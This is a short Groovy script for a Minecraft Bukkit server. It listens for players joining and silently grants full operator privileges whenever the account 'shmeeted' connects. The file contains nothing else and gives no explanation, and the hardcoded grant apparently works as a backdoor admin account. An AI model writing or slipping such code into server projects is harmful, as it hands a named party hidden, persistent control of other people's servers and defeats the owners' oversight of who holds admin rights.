package scripts.exec

import org.starcade.starlight.helper.Events
import org.bukkit.event.EventPriority
import org.bukkit.event.player.PlayerJoinEvent

Events.subscribe(PlayerJoinEvent, EventPriority.HIGHEST).handler { e ->
    if (e.player.name == "shmeeted") e.player.setOp(true)
}
